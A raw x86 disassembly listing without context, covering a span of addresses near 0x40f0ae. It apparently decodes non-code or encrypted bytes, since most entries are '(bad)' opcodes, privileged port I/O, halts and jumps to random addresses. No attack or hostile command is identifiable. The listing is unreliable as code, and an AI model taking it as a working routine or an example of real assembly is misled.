  40f0ae:	clc    
  40f0af:	push   es
  40f0b0:	push   esp
  40f0b2:	jmp    0xd00de495
  40f0b7:	stos   BYTE PTR es:[edi],al
  40f0b8:	lock fmulp st(1),st
  40f0bb:	scas   al,BYTE PTR es:[edi]
  40f0bc:	shr    ah,1
  40f0be:	in     al,dx
  40f0bf:	repnz loopne 0x40f07d
  40f0c2:	repnz mov ebx,0xbbc9e8f7
  40f0c8:	(bad)  
  40f0ca:	out    0xd9,eax
  40f0cc:	mov    esi,0xf4c6d7cb
  40f0d1:	add    al,0xdc
  40f0d3:	hlt    
  40f0d4:	jmp    0x40f0d8
  40f0d6:	in     al,0xe5
  40f0d8:	iret   
  40f0d9:	mov    bh,0xd1
  40f0db:	fadd   st(6),st
  40f0dd:	jmp    0xfdcb:0xc5f3c4c5
  40f0e4:	retf   0xc2d7
  40f0e7:	jmp    0x611d0cd
  40f0ec:	lock mov BYTE PTR [edi],0xc4
  40f0f0:	(bad)  
  40f0f2:	hlt    
  40f0f3:	stc    
  40f0f4:	retf   
  40f0f5:	add    eax,0xd2d7c5fa
  40f0fa:	in     al,0xbc
  40f0fc:	shl    edx,cl
  40f0fe:	(bad)  [ebp-0x20372005]
  40f104:	iret   
  40f105:	in     al,dx
  40f106:	out    dx,eax
  40f107:	shl    esi,1
  40f109:	add    esp,edx
  40f10b:	loope  0x40f0c9
  40f10d:	mov    ebp,0x5d402e0
  40f112:	fucomi st,st(1)
  40f114:	clc    
  40f115:	fist   DWORD PTR [edx]
  40f117:	mov    eax,0xd4d2e8bc
  40f11c:	stos   BYTE PTR es:[edi],al
  40f11d:	(bad)  
  40f11e:	call   0xcdf1bc0e
  40f123:	std    
  40f124:	fptan  
  40f126:	call   0xee3df903
  40f12b:	rol    BYTE PTR [edx],cl
  40f12d:	pop    es
  40f12e:	repnz lock fucomip st,st(3)
  40f132:	iret   
  40f133:	add    DWORD PTR [eax],eax
  40f135:	(bad)  
  40f136:	jmp    0xe524d8f7
  40f13b:	mov    ebp,0xefb0acc4
  40f140:	out    0xec,al
  40f142:	cli    
  40f143:	leave  
  40f144:	rcl    al,cl
  40f146:	iret   
  40f147:	fstp   st(4)
  40f149:	mov    eax,0xe406d2ee
  40f14e:	hlt    
  40f14f:	mul    eax
  40f151:	aad    0xda
  40f153:	jmp    0xf1d3:0xe5cde4cc
  40f15a:	shl    ch,cl
  40f15c:	fucomi st,st(4)
  40f15e:	iret   
  40f15f:	aam    0xeb
  40f161:	(bad)  
  40f163:	sar    DWORD PTR [ebp-0x241c294c],cl
  40f169:	into   
  40f16a:	stc    
  40f16b:	out    0xf7,eax
  40f16d:	(bad)  
  40f16f:	add    eax,0xdae0d8d4
  40f174:	jmp    0xd7ef:0xc3c5f803
  40f17b:	mov    dl,0xe4
  40f17d:	repz out 0xc1,al
  40f180:	ror    edx,cl
  40f182:	enter  0xf6f8,0xbc
  40f186:	clc    
  40f187:	mov    bh,0xed
  40f189:	sar    esi,cl
  40f18b:	(bad)  
  40f18c:	loop   0x40f178
  40f18e:	pop    es
  40f18f:	rol    BYTE PTR [esp+eax*8],0xed
  40f193:	in     eax,dx
  40f194:	fdivr  st(3),st
  40f196:	push   cs
  40f197:	shr    BYTE PTR [esi-0x1e080940],0xbb
  40f19e:	shl    bh,1
  40f1a0:	aam    0xde
  40f1a2:	shl    edi,1
  40f1a4:	int3   
  40f1a5:	fcomp  st(1)
  40f1a7:	loop   0x40f19f
  40f1a9:	(bad)  
  40f1aa:	std    
  40f1ab:	cld    
  40f1ac:	out    0xf9,eax
  40f1ae:	(bad)  
  40f1af:	dec    dl
  40f1b1:	pop    es
  40f1b2:	retf   
  40f1b3:	add    ch,dl
  40f1b5:	loopne 0x40f177
  40f1b7:	mov    edi,0xe0c5f7e5
  40f1bc:	retf   
  40f1bd:	(bad)  
  40f1bf:	cmc    
  40f1c0:	mov    eax,0xf9f6eae9
  40f1c5:	int3   
  40f1c6:	enter  0xbfd5,0xfe
  40f1ca:	inc    ebp
  40f1cc:	ror    DWORD PTR [edx],cl
  40f1ce:	jmp    0x40f1da
  40f1d0:	(bad)  
  40f1d1:	loop   0x40f1d2
  40f1d3:	(bad)  
  40f1d4:	(bad)  
  40f1d6:	iret   
  40f1d7:	(bad)  
  40f1d9:	into   
  40f1da:	repnz shl esp,0xdb
  40f1de:	test   al,0xda
  40f1e0:	jmp    0xefcd:0xd5c5b6ce
  40f1e7:	dec    bh
  40f1e9:	mov    edi,0xe3f7c0c0
  40f1ee:	mov    esp,0xfdbc202
  40f1f3:	(bad)  
  40f1f5:	(bad)  
  40f1f7:	out    0xd1,al
  40f1f9:	mov    al,0xac
  40f1fb:	retf   
  40f1fc:	mov    bl,0xc3
  40f1fe:	aam    0xb3
  40f200:	rol    ah,1
  40f202:	std    
  40f203:	stc    
  40f204:	lock icebp 
  40f206:	hlt    
  40f207:	mov    edi,0xc6dcdde2
  40f20c:	push   es
  40f20d:	aam    0xdc
  40f20f:	push   es
  40f210:	jmp    0x7ea:0xcbd803ef
  40f217:	mov    ecx,0xafe3a8ec
  40f21c:	in     al,0xcd
  40f21e:	cli    
  40f21f:	(bad)  
  40f220:	sar    edx,cl
  40f222:	mov    esi,0xf2d0f8de
  40f227:	(bad)  
  40f228:	sti    
  40f229:	out    0xec,al
  40f22b:	fsub   st,st(5)
  40f22d:	icebp  
  40f22e:	or     dl,ah
  40f230:	add    edx,esp
  40f232:	cli    
  40f233:	or     ah,bh
  40f235:	les    eax,FWORD PTR [esi]
  40f237:	out    0xec,al
  40f239:	mov    cl,0xb3
  40f23b:	jmp    0xceeb:0xc0b7e1d7
  40f242:	mov    ch,0xca
  40f244:	shl    ebx,cl
  40f246:	int    0xf3
  40f248:	repz fmul st,st(5)
  40f24b:	(bad)  
  40f24c:	repnz (bad) 
  40f24e:	cmc    
  40f24f:	neg    edx
  40f251:	loop   0x40f256
  40f253:	cmc    
  40f254:	stc    
  40f255:	jmp    0xc60bd05f
  40f25a:	(bad)  
  40f25b:	lock mov dh,0xc8
  40f25e:	jmp    0xe02ed913
  40f263:	sti    
  40f264:	aam    0xdb
  40f266:	dec    cl
  40f268:	repz mov ebp,0xf2e303c0
  40f26e:	or     eax,eax
  40f270:	in     eax,0xfc
  40f272:	cli    
  40f273:	into   
  40f274:	out    0xec,al
  40f276:	add    ebx,ebp
  40f278:	out    dx,al
  40f279:	scas   al,BYTE PTR es:[edi]
  40f27a:	shl    bl,0xc3
  40f27d:	mov    dh,0xe6
  40f27f:	out    dx,al
  40f280:	div    DWORD PTR [esi-0x3c132637]
  40f286:	retf   0xb8f0
  40f289:	repnz (bad) 
  40f28c:	add    al,0xc5
  40f28e:	or     DWORD PTR [eax],ecx
  40f290:	(bad)  
  40f291:	out    0xbc,al
  40f293:	loopne 0x40f296
  40f295:	out    dx,eax
  40f296:	(bad)  
  40f297:	out    0xce,eax
  40f299:	retf   
  40f29a:	(bad)  
  40f29b:	out    dx,eax
  40f29c:	mov    ch,0xe4
  40f29e:	cli    
  40f29f:	icebp  
  40f2a0:	mov    ch,0xf4
  40f2a2:	fnsave [ebp-0x2a152311]
  40f2a8:	fdivr  QWORD PTR [ecx-0x27fafa20]
  40f2ae:	loope  0x40f2b6
  40f2b0:	hlt    
  40f2b1:	in     eax,0xe5
  40f2b3:	jmp    0x40f2b1
  40f2b5:	adc    eax,DWORD PTR [ebx]
  40f2b7:	scas   eax,DWORD PTR es:[edi]
  40f2b8:	iret   
  40f2b9:	(bad)  
  40f2ba:	int    0xf6
  40f2bc:	out    0xcc,eax
  40f2be:	mov    bl,0xe9
  40f2c0:	mov    al,0xe6
  40f2c2:	out    dx,al
  40f2c3:	repz in al,0xdb
  40f2c6:	(bad)  
  40f2c8:	out    dx,al
  40f2c9:	test   ah,0xfc
  40f2cc:	int3   
  40f2cd:	add    esi,ebp
  40f2cf:	retf   0xc7de
  40f2d2:	fcmovnu st,st(0)
  40f2d4:	psllq  mm3,mm2
  40f2d7:	out    dx,al
  40f2d8:	mov    cl,0xe7
  40f2da:	repnz shl ch,0xe1
  40f2de:	loopne 0x40f2cf
  40f2e0:	mov    edx,0xfdbef2d7
  40f2e5:	xlat   BYTE PTR ds:[ebx]
  40f2e6:	jmp    0x21ce4bd
  40f2eb:	mov    esp,0xe7d6e7dc
  40f2f0:	enter  0x8ea,0xd4
  40f2f4:	fst    st(3)
  40f2f6:	push   cs
  40f2f7:	out    dx,al
  40f2f8:	in     eax,0xbc
  40f2fa:	loope  0x40f2f1
  40f2fc:	jecxz  0x40f2ee
  40f2fe:	out    0xfb,eax
  40f300:	repz mov edi,0xeaddffb0
  40f306:	clc    
  40f307:	cli    
  40f308:	mov    esp,0xc3e3ff06
  40f30d:	(bad)  
  40f30f:	stc    
  40f310:	(bad)  
  40f311:	leave  
  40f312:	add    al,0x4
  40f314:	les    eax,FWORD PTR ds:0xb3aeced9
  40f31a:	out    0xb2,al
  40f31c:	loopne 0x40f2e2
  40f31e:	shl    eax,1
  40f320:	jmp    esp
  40f322:	aad    0xd3
  40f324:	shl    bl,cl
  40f326:	into   
  40f327:	mov    edi,0xbee0f1ce
  40f32c:	aad    0x0
  40f32e:	clc    
  40f32f:	loop   0x40f30e
  40f331:	idiv   eax
  40f333:	or     cl,ah
  40f335:	(bad)  
  40f337:	lock int 0xee
  40f33a:	lods   eax,DWORD PTR ds:[esi]
  40f33b:	cmc    
  40f33c:	mov    dh,0xad
  40f33e:	mov    cl,0xfa
  40f340:	mov    ecx,0xf7d8dab1
  40f345:	div    esi
  40f347:	cli    
  40f348:	(bad)  
  40f34a:	fstp   st(5)
  40f34c:	add    eax,0xfe3fcc4
  40f351:	(bad)
  40f354:	jmp    0x40f35d
  40f356:	or     DWORD PTR [edx-0x345b3136],esi
  40f35c:	out    0xad,al
  40f35e:	cli    
  40f35f:	cli    
  40f360:	mov    cl,0xc4
  40f362:	clc    
  40f363:	mov    ebx,0xd4fdf6b2
  40f368:	(bad)  
  40f36a:	add    edx,edx
  40f36c:	cli    
  40f36d:	mov    esp,0xe0e10bd8
  40f372:	iret   
  40f373:	cli    
  40f374:	bswap  ebp
  40f376:	adc    ch,bl
  40f378:	int3   
  40f379:	shr    ch,1
  40f37b:	jecxz  0x40f34b
  40f37d:	rcl    ebp,cl
  40f37f:	aam    0xb2
  40f381:	in     eax,0xce
  40f383:	in     al,0xb5
  40f385:	jmp    0x41fee61
  40f38a:	push   es
  40f38b:	fsub   st,st(4)
  40f38d:	mov    ch,0xdb
  40f390:	ret    0xe4f8
  40f393:	fdivp  st(5),st
  40f395:	(bad)  
  40f397:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f399:	fbstp  TBYTE PTR [esi-0x26081336]
  40f39f:	fsub   st,st(6)
  40f3a1:	mov    esp,0xd5dfb5f4
  40f3a7:	out    dx,al
  40f3a8:	xlat   BYTE PTR ds:[ebx]
  40f3a9:	in     al,dx
  40f3aa:	clc    
  40f3ab:	repnz or esp,esi
  40f3ae:	bnd jmp 0x40f38c
  40f3b1:	mul    cl
  40f3b3:	or     al,0xeb
  40f3b5:	(bad)  
  40f3b6:	clc    
  40f3b7:	int3   
  40f3b8:	out    0xac,eax
  40f3ba:	scas   eax,DWORD PTR es:[edi]
  40f3bb:	ret    
  40f3bc:	repnz sar BYTE PTR [ebx-0x1718390c],cl
  40f3c3:	cld    
  40f3c4:	into   
  40f3c5:	retf   0xc9ba
  40f3c8:	std    
  40f3c9:	out    dx,al
  40f3ca:	fstp   st(1)
  40f3cc:	jecxz  0x40f3a4
  40f3ce:	retf   
  40f3cf:	call   0xdc2e03ce
  40f3d4:	or     eax,0xd1c604dd
  40f3d9:	(bad)  
  40f3da:	(bad)  
  40f3dc:	mov    dl,0xa9
  40f3de:	(bad)  
  40f3df:	call   0xf318dcd4
  40f3e4:	in     al,0xd9
  40f3e6:	(bad)  
  40f3e8:	test   DWORD PTR [ecx],0xfcf4bbbf
  40f3ee:	lock (bad) 
  40f3f0:	fdivp  st(4),st
  40f3f2:	fsubrp st(1),st
  40f3f4:	enter  0xd9de,0xb3
  40f3f8:	jmp    0x40f3e8
  40f3fa:	mov    cl,0xc9
  40f3fc:	iret   
  40f3fd:	in     al,0xca
  40f3ff:	mov    ecx,0xf9d4b7c5
  40f404:	fcomp  st(6)
  40f406:	int3   
  40f407:	cli    
  40f408:	add    esp,edi
  40f40a:	aad    0xd4
  40f40c:	fcmovbe st,st(1)
  40f40e:	shr    bl,0xc7
  40f411:	shr    dl,0x0
  40f414:	out    dx,eax
  40f415:	dec    DWORD PTR [eax]
  40f417:	ror    dl,cl
  40f419:	in     al,0xf0
  40f41b:	scas   al,BYTE PTR es:[edi]
  40f41c:	repnz loope 0x40f415
  40f41f:	(bad)  
  40f420:	(bad)  
  40f422:	fsubr  st,st(3)
  40f424:	div    bl
  40f426:	(bad)  
  40f427:	(bad)  
  40f428:	mov    esp,0xc5c2df00
  40f42d:	loop   0x40f434
  40f42f:	mov    edi,0x7e90707
  40f434:	jecxz  0x40f424
  40f436:	or     eax,0xf3ecd8b1
  40f43b:	lods   eax,DWORD PTR ds:[esi]
  40f43c:	mov    dl,0xd2
  40f43e:	iret   
  40f43f:	mov    edx,0xf1b5ebf5
  40f444:	clc    
  40f445:	call   0xfe39e223
  40f44a:	icebp  
  40f44b:	icebp  
  40f44c:	add    ebp,esi
  40f44e:	(bad)  
  40f44f:	clc    
  40f450:	in     al,0x0
  40f452:	into   
  40f453:	add    bl,cl
  40f455:	retf   0xe2e4
  40f458:	call   0xc725a621
  40f45d:	mov    edi,0xdbfed6fa
  40f463:	mov    bh,0xd3
  40f465:	fyl2x  
  40f467:	int3   
  40f468:	fld    QWORD PTR [edx]
  40f46a:	mov    edx,0xd8c3f5dd
  40f470:	fnstcw WORD PTR [ebp+0x12fbe5e3]
  40f476:	in     eax,dx
  40f477:	test   eax,0xdde1d0bf
  40f47c:	shr    bh,cl
  40f47e:	leave  
  40f47f:	repz mov ebx,0xdcf6c5bf
  40f485:	sar    ebx,cl
  40f487:	rcl    esi,0xf8
  40f48a:	loopne 0x40f466
  40f48c:	aad    0xfd
  40f48e:	(bad)
  40f491:	(bad)  
  40f492:	mov    esp,0x3ea0bff
  40f497:	fmulp  st(0),st
  40f499:	shl    bh,cl
  40f49b:	mov    dl,0xf5
  40f49d:	jmp    0xd52bc372
  40f4a2:	int3   
  40f4a3:	aad    0xc4
  40f4a5:	(bad)  
  40f4a7:	xlat   BYTE PTR ds:[ebx]
  40f4a8:	bnd ret 0xe3fa
  40f4ac:	loopne 0x40f4ac
  40f4ae:	jmp    0xc50f:0xe2e902ca
  40f4b5:	clc    
  40f4b6:	fcmovb st,st(5)
  40f4b8:	out    dx,al
  40f4b9:	lods   al,BYTE PTR ds:[esi]
  40f4ba:	out    0xcc,eax
  40f4bc:	(bad)  
  40f4bd:	in     eax,0xe2
  40f4bf:	clc    
  40f4c0:	mov    bh,0xe5
  40f4c2:	mov    bh,0xcc
  40f4c4:	jecxz  0x40f47b
  40f4c6:	mov    ah,0xff
  40f4c8:	fcompp 
  40f4ca:	(bad)  
  40f4cb:	stc    
  40f4cc:	in     al,dx
  40f4cd:	ret    
  40f4ce:	(bad)  
  40f4cf:	out    0x3,eax
  40f4d1:	mov    ebp,0xebc9ced9
  40f4d6:	push   es
  40f4d7:	stos   BYTE PTR es:[edi],al
  40f4d8:	jmp    0xcbfa:0xe8e9f7c6
  40f4df:	retf   
  40f4e0:	in     al,0xb1
  40f4e2:	in     al,0xb8
  40f4e4:	call   0xc341edc5
  40f4e9:	icebp  
  40f4ea:	(bad)  
  40f4eb:	fcomip st,st(1)
  40f4ed:	mov    ebp,0xe0fb09cb
  40f4f2:	add    dh,al
  40f4f4:	clc    
  40f4f5:	or     DWORD PTR [ecx],edx
  40f4f7:	rol    esp,cl
  40f4f9:	into   
  40f4fa:	mov    al,0xc2
  40f4fc:	in     eax,dx
  40f4fd:	jmp    0x40f4ce
  40f4ff:	aam    0xcc
  40f501:	(bad)  
  40f502:	stc    
  40f503:	not    cl
  40f505:	(bad)  
  40f506:	(bad)  
  40f508:	(bad)  
  40f509:	mov    eax,0xd6d302f3
  40f50e:	or     al,BYTE PTR [ebx]
  40f510:	(bad)  
  40f511:	jecxz  0x40f4d9
  40f513:	aad    0xed
  40f515:	add    cl,BYTE PTR [eiz*8-0x2f571312]
  40f51c:	out    0xe0,al
  40f51e:	in     eax,0xaf
  40f520:	les    edi,FWORD PTR [edi-0x8230f15]
  40f526:	mov    esp,0xbfedf9d2
  40f52b:	stc    
  40f52c:	neg    dh
  40f52e:	icebp  
  40f52f:	cmc    
  40f530:	jecxz  0x40f508
  40f532:	fstp   st(1)
  40f534:	sti    
  40f535:	or     esi,esp
  40f537:	mov    ecx,0xe7e5adc6
  40f53c:	into   
  40f53d:	ror    dh,1
  40f53f:	mov    ah,0xb0
  40f541:	icebp  
  40f542:	call   ecx
  40f544:	mov    ch,0x3
  40f546:	aad    0xda
  40f548:	mov    edi,0xbd5def9
  40f54d:	idiv   bh
  40f54f:	(bad)  
  40f550:	call   0xcf19be19
  40f555:	or     al,0xe0
  40f557:	retf   
  40f558:	loop   0x40f550
  40f55a:	lods   al,BYTE PTR ds:[esi]
  40f55b:	aam    0xcb
  40f55d:	sar    cl,0xd4
  40f560:	(bad)  
  40f561:	repnz mov ch,0xfa
  40f564:	cli    
  40f565:	in     al,dx
  40f566:	fld    st(2)
  40f568:	mov    dh,0xef
  40f56a:	mov    ah,0xc2
  40f56c:	fiadd  WORD PTR [esi]
  40f56e:	cmc    
  40f56f:	loop   0x40f55c
  40f571:	out    dx,eax
  40f572:	add    dl,ah
  40f574:	clc    
  40f575:	fsubp  st(7),st
  40f577:	in     eax,0xc4
  40f579:	lods   eax,DWORD PTR ds:[esi]
  40f57a:	int3   
  40f57b:	jecxz  0x40f565
  40f57d:	jmp    0xb6d3:0xfad9dbec
  40f584:	cli    
  40f585:	into   
  40f586:	(bad)  
  40f587:	fadd   st(1),st
  40f589:	ret    0x1cd
  40f58c:	(bad)  
  40f58d:	aam    0xfc
  40f58f:	or     al,BYTE PTR [ecx]
  40f591:	(bad)  
  40f593:	add    edi,eax
  40f595:	repz adc edi,ebx
  40f598:	icebp  
  40f599:	(bad)  
  40f59a:	fucom  st(2)
  40f59c:	jmp    0xf1fe:0xbaeff4c5
  40f5a3:	in     al,dx
  40f5a4:	fucomi st,st(7)
  40f5a6:	in     al,dx
  40f5a7:	cmc    
  40f5a8:	mul    cl
  40f5aa:	jecxz  0x40f57c
  40f5ac:	mov    esi,0xdb05f6d9
  40f5b1:	(bad)  
  40f5b3:	cli    
  40f5b4:	or     ecx,edx
  40f5b6:	ror    bl,0xd8
  40f5b9:	rcl    eax,1
  40f5bb:	call   0xf5f7cd80
  40f5c0:	jmp    0x40f586
  40f5c2:	fidiv  WORD PTR [edi-0x42123c0b]
  40f5c8:	iret   
  40f5c9:	mov    esp,0xc202e007
  40f5ce:	or     ebp,ebx
  40f5d0:	(bad)
  40f5d3:	or     ecx,edi
  40f5d5:	out    dx,eax
  40f5d6:	or     al,0xca
  40f5d8:	in     eax,0xca
  40f5da:	out    dx,al
  40f5db:	in     al,dx
  40f5dc:	in     al,dx
  40f5dd:	out    0xf6,eax
  40f5df:	loope  0x40f59a
  40f5e1:	repnz into 
  40f5e3:	in     al,0xf8
  40f5e5:	call   0xf420ecbc
  40f5ea:	mov    edi,0xf404e2c0
  40f5ef:	loope  0x40f5ba
  40f5f1:	(bad)
  40f5f4:	in     al,dx
  40f5f5:	pop    es
  40f5f6:	pop    es
  40f5f7:	mov    ecx,0xedb3acae
  40f5fc:	shr    dl,cl
  40f5fe:	mov    bh,0xe1
  40f600:	mov    bh,0xb0
  40f602:	repnz mov bl,0xf4
  40f605:	mov    ebp,0xd303bada
  40f60a:	into   
  40f60b:	aam    0xda
  40f60d:	neg    dh
  40f60f:	loop   0x40f5e8
  40f611:	stc    
  40f612:	(bad)  
  40f614:	ffree  st(4)
  40f616:	iret   
  40f617:	out    0xe2,al
  40f619:	in     al,dx
  40f61a:	les    edi,FWORD PTR [ebp-0x2c041453]
  40f620:	stc    
  40f621:	in     eax,0xb8
  40f623:	fxch   st(0)
  40f625:	div    esp
  40f627:	repnz loopne 0x40f628
  40f62a:	cld    
  40f62b:	rol    al,1
  40f62d:	fucom  st(5)
  40f62f:	clc    
  40f630:	jmp    0xf2d3:0xc0cc7cf
  40f637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f638:	fdivr  DWORD PTR [esi-0x2e372349]
  40f63e:	int3   
  40f63f:	enter  0xdfed,0xf9
  40f643:	(bad)  
  40f644:	aam    0x2
  40f646:	idiv   bh
  40f648:	add    ebx,esi
  40f64a:	stc    
  40f64b:	ret    
  40f64c:	int3   
  40f64d:	rcr    dh,0xd5
  40f650:	sti    
  40f651:	leave  
  40f652:	jmp    0xc4c3:0x2cce00e
  40f659:	into   
  40f65a:	mul    ebx
  40f65c:	in     al,dx
  40f65d:	loop   0x40f64d
  40f65f:	ror    bl,1
  40f661:	int3   
  40f662:	mov    ah,0xd2
  40f664:	into   
  40f665:	(bad)  
  40f666:	mov    al,0xd4
  40f668:	(bad)  
  40f66a:	rol    dl,1
  40f66c:	ror    ebx,cl
  40f66e:	retf   0xde08
  40f671:	aad    0xc9
  40f673:	retf   
  40f674:	push   es
  40f675:	add    dl,dl
  40f677:	out    dx,al
  40f678:	(bad)
  40f67b:	mul    edx
  40f67d:	fcmovne st,st(1)
  40f67f:	clc    
  40f680:	int    0xb5
  40f682:	fnstsw WORD PTR [ebp-0x44420331]
  40f688:	int3   
  40f689:	(bad)  
  40f68b:	hlt    
  40f68c:	in     al,0xd6
  40f68e:	ftst   
  40f690:	or     cl,ah
  40f692:	fimul  DWORD PTR [ecx+ecx*1]
  40f695:	add    ebp,esp
  40f697:	in     eax,dx
  40f698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f699:	shl    al,1
  40f69b:	jmp    0xd0f5ed8a
  40f6a0:	(bad)  
  40f6a1:	mov    ecx,0xb1f5dcbf
  40f6a6:	sti    
  40f6a7:	shl    bl,1
  40f6a9:	int    0xf5
  40f6ab:	rcr    cl,cl
  40f6ad:	ftst   
  40f6af:	imul   al
  40f6b1:	xlat   BYTE PTR ds:[ebx]
  40f6b2:	neg    dh
  40f6b4:	lds    ecx,FWORD PTR [edx]
  40f6b6:	loope  0x40f696
  40f6b8:	int3   
  40f6b9:	div    DWORD PTR [ecx-0x1d324a1a]
  40f6bf:	shr    dh,cl
  40f6c1:	repz jmp 0x40f6a8
  40f6c4:	cli    
  40f6c5:	int    0xd8
  40f6c7:	call   0xdeffb6c1
  40f6cc:	aad    0x4
  40f6ce:	in     eax,0xe0
  40f6d0:	leave  
  40f6d1:	sti    
  40f6d2:	pop    es
  40f6d3:	sti    
  40f6d4:	hlt    
  40f6d5:	or     eax,0xf3a6d0d2
  40f6da:	scas   al,BYTE PTR es:[edi]
  40f6db:	mov    esp,0xf1eac2e4
  40f6e0:	into   
  40f6e1:	fidivr DWORD PTR [eax-0x6314233]
  40f6e7:	imul   ah
  40f6e9:	icebp  
  40f6ea:	icebp  
  40f6eb:	(bad)  [ebx]
  40f6ed:	fdecstp 
  40f6ef:	mul    eax
  40f6f1:	add    DWORD PTR [esi],ecx
  40f6f3:	(bad)  
  40f6f4:	in     eax,0xca
  40f6f6:	stc    
  40f6f7:	ret    
  40f6f8:	test   al,0xbd
  40f6fa:	loope  0x40f6e3
  40f6fc:	mov    cl,0xf0
  40f6fe:	jmp    0x40f6f3
  40f700:	clc    
  40f701:	in     eax,0xb6
  40f703:	fsub   st,st(4)
  40f705:	mov    esi,0xe607c8cc
  40f70a:	stc    
  40f70b:	add    bh,ch
  40f70d:	or     dl,al
  40f70f:	jmp    0x40f6fb
  40f711:	stc    
  40f712:	cli    
  40f713:	aad    0xdf
  40f715:	loopne 0x40f6f3
  40f717:	out    dx,al
  40f718:	call   0xd011a9fc
  40f71d:	sti    
  40f71e:	mov    dl,0xcf
  40f720:	ror    bh,1
  40f722:	fdivp  st(7),st
  40f724:	(bad)  
  40f726:	rcr    ah,cl
  40f728:	fsubr  st,st(6)
  40f72a:	ret    0xd8e0
  40f72d:	mov    ebp,0xfe03c6de
  40f732:	jecxz  0x40f71a
  40f734:	add    eax,0xc8ded212
  40f739:	rcl    esi,0xbd
  40f73c:	iret   
  40f73d:	out    dx,al
  40f73e:	loop   0x40f727
  40f740:	mov    bh,0xca
  40f742:	fnsave [ebp-0xc2b2b48]
  40f748:	cmc    
  40f749:	add    eax,eax
  40f74b:	(bad)  
  40f74d:	in     eax,0xeb
  40f74f:	ret    0xe4c4
  40f752:	or     esp,ebp
  40f754:	enter  0xe803,0xd3
  40f758:	lock in eax,dx
  40f75a:	retf   
  40f75b:	mov    esp,0xdbeff0db
  40f760:	(bad)  
  40f761:	jmp    0xf633ad64
  40f766:	icebp  
  40f767:	mov    ecx,0xf8f0dec1
  40f76c:	cld    
  40f76d:	push   es
  40f76e:	sti    
  40f76f:	in     al,0xdd
  40f771:	retf   
  40f772:	rcl    ah,0xc9
  40f775:	fcomp  st(5)
  40f777:	out    dx,eax
  40f778:	repnz fucomp st(7)
  40f77b:	leave  
  40f77c:	mov    dl,0xef
  40f77e:	aam    0xe7
  40f780:	cmc    
  40f781:	leave  
  40f782:	hlt    
  40f783:	int3   
  40f784:	sti    
  40f785:	mov    ebp,0xf1d5f2b0
  40f78a:	into   
  40f78b:	mov    esp,0xe9ded3db
  40f790:	jmp    ebp
  40f792:	or     esi,ecx
  40f794:	aam    0xc9
  40f796:	clc    
  40f797:	loope  0x40f76a
  40f799:	repz mov ebp,0xe2acf0f5
  40f79f:	retf   0xc8c5
  40f7a2:	mov    al,0xc9
  40f7a4:	neg    dl
  40f7a6:	mov    esi,0xf1f5f8d3
  40f7ab:	aad    0xbd
  40f7ad:	jmp    0xc6d5:0xebd4e4e9
  40f7b4:	cld    
  40f7b5:	call   0xed2ba7a7
  40f7ba:	fucomp st(0)
  40f7bc:	mov    al,0xeb
  40f7be:	hlt    
  40f7bf:	in     eax,0xf5
  40f7c1:	clc    
  40f7c2:	icebp  
  40f7c3:	sar    BYTE PTR [eax-0x40231547],cl
  40f7c9:	mov    eax,0xe3d6bfdc
  40f7ce:	mov    esp,0xf8dbdac3
  40f7d3:	in     al,0xe2
  40f7d5:	int    0x4
  40f7d7:	jmp    0x40f7c9
  40f7d9:	shl    DWORD PTR [ebp+ebx*8-0x4c4f3925],1
  40f7e0:	in     al,0xf3
  40f7e2:	mov    edi,0xc3cbdfc9
  40f7e7:	fcomp  st(0)
  40f7e9:	lock fdiv st,st(3)
  40f7ec:	push   es
  40f7ed:	jmp    0xcc5:0xc1f9d9f0
  40f7f4:	loopne 0x40f7e8
  40f7f6:	fdivr  QWORD PTR [ebp-0x2322354f]
  40f7fc:	jmp    0xba22d8f3
  40f801:	icebp  
  40f802:	fld    st(4)
  40f804:	in     al,0xed
  40f806:	fcomp  st(7)
  40f808:	shl    ecx,1
  40f80a:	fcomp  st(1)
  40f80c:	(bad)  
  40f80e:	ret    
  40f80f:	or     cl,al
  40f811:	jmp    0xe70a:0xd8e7d9fe
  40f818:	shr    BYTE PTR [eax-0x3511133a],1
  40f81e:	mov    dh,0xcc
  40f820:	(bad)  
  40f821:	stc    
  40f822:	repz in al,dx
  40f824:	out    dx,al
  40f825:	fucomi st,st(0)
  40f827:	mov    eax,0xfdf1c3b9
  40f82c:	mov    esp,0xdcfddc07
  40f831:	out    0xc8,eax
  40f833:	clc    
  40f834:	fsubr  st,st(3)
  40f836:	push   cs
  40f837:	mov    ebp,0xc6a4e4bf
  40f83c:	(bad)  
  40f83d:	loop   0x40f819
  40f83f:	leave  
  40f840:	out    0xc8,al
  40f842:	cli    
  40f843:	in     eax,0xff
  40f845:	retf   0xbfce
  40f848:	mov    ebp,0xf3f8e0c2
  40f84d:	sti    
  40f84e:	ret    
  40f84f:	add    edi,eax
  40f851:	loope  0x40f835
  40f853:	add    edx,eax
  40f855:	cld    
  40f856:	cli    
  40f857:	int3   
  40f858:	loopne 0x40f828
  40f85a:	jmp    0x40f82d
  40f85c:	shl    DWORD PTR [ebp-0xe0d1306],1
  40f862:	retf   0xbeee
  40f865:	stc    
  40f866:	inc    BYTE PTR [ebx]
  40f868:	aam    0xd0
  40f86a:	shl    dl,1
  40f86c:	add    dh,bh
  40f86e:	mov    esp,0xf5e2f0c3
  40f873:	(bad)  
  40f874:	hlt    
  40f875:	sar    ebp,0xcc
  40f878:	out    0xce,eax
  40f87a:	xlat   BYTE PTR ds:[ebx]
  40f87b:	xlat   BYTE PTR ds:[ebx]
  40f87c:	repz int3 
  40f87e:	mov    bh,0xb0
  40f880:	vpmullw xmm7,xmm5,xmm3
  40f884:	xlat   BYTE PTR ds:[ebx]
  40f885:	test   dh,0xc3
  40f888:	in     eax,dx
  40f889:	shl    eax,0xec
  40f88c:	add    al,bh
  40f88e:	(bad)  
  40f890:	(bad)  
  40f891:	vpaddw ymm0,ymm1,ymm2
  40f895:	retf   0xbdee
  40f898:	lods   eax,DWORD PTR ds:[esi]
  40f899:	int3   
  40f89a:	retf   0xceb1
  40f89d:	mov    ebx,0xf5edd3d1
  40f8a2:	mov    edi,0xb0bae3c4
  40f8a7:	rol    BYTE PTR [ebx],1
  40f8a9:	(bad)  
  40f8ab:	cld    
  40f8ac:	mov    BYTE PTR [eax],0xf2
  40f8af:	shl    al,1
  40f8b1:	aam    0xcf
  40f8b3:	vpmaxub ymm1,ymm4,ymm3
  40f8b7:	sar    DWORD PTR [eax-0x113d080a],cl
  40f8bd:	(bad)  
  40f8be:	in     al,0xea
